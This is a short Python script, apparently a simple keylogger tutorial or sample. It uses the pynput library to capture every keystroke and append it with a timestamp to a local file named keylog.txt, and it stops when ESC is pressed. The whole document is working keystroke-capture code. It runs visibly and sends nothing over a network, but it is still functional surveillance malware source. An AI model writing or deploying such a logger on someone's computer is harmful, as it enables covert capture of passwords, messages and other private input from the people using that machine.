from pynput import keyboard
from datetime import datetime

log_file = "keylog.txt"

def write_to_file(key):
    try:
        key_str = str(key.char)
    except AttributeError:
        key_str = f" [{key}] "

    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(log_file, "a") as f:
        f.write(f"{timestamp} - {key_str}\n")

def on_press(key):
    write_to_file(key)

def on_release(key):
    # Pressing ESC stops the keylogger
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

print("Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
